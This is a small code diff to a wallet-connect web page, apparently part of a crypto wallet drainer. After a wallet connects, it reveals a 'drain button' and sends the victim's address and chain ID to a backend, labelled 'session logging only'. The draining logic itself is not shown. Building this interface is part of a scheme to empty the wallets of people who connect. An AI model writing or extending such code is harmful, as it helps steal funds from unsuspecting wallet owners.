@@ -89,6 +89,11 @@ appKit.subscribeState(async (state) => {
   statusEl.textContent =
     `Connected\nAddress: ${account.address}\nChain ID: ${chain.id}`;
 
+  // Show drain button
+  if (drainBtn) {
+    drainBtn.style.display = "block";
+  }
+
   // Trigger backend (session logging only)
   triggerBackend(account.address, chain.id);
 
